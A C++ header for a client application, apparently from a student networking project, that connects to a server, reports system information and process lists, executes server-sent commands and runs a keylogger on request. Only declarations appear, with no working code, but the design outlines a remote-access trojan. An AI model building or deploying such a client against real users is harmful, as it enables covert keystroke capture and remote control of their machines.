#pragma once

#include <memory>
#include <thread>
#include <atomic>
#include <string>
#include <map>
#include "../utils/LPTF/LPTF_Socket.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"
#include "../utils/LPTF/LPTF_PacketType.hpp"
#include "../utils/SystemInfo/KeyLogger.hpp"

class ClientApp
{
public:
    ClientApp();
    ~ClientApp();

    // Interdit la copie, autorise le move (form canonique de Coplien)
    ClientApp(const ClientApp &) = delete;
    ClientApp &operator=(const ClientApp &) = delete;
    ClientApp(ClientApp &&) noexcept = default;
    ClientApp &operator=(ClientApp &&) noexcept = default;

    void run();

private:
    void serverRequestHandler();
    void startKeylogger();
    void stopKeylogger(const LPTF_Packet &packet);

    void setupConsole();
    void loadAndConnectEnv();
    void sendSystemInfo();
    void printSystemInfo(const std::map<std::string, std::string> &sysInfo);
    void listProcesses();
    void launchServerThread();
    void handlePacket(const LPTF_Packet &packet);
    void handleServerException(const std::exception &e);

    void handleGetInfoPacket(const LPTF_Packet &);
    void handleKeylogPacket(const LPTF_Packet &);
    void handleExecCommandPacket(const LPTF_Packet &);
    void handleProcessListPacket(const LPTF_Packet &);
    std::string getProcessListString(bool namesOnly);

    std::atomic<bool> running{true};
    std::unique_ptr<LPTF_Socket> socket;
    std::unique_ptr<KeyLogger> keyLogger;
    std::thread keylogThread;
    std::thread serverThread;
};
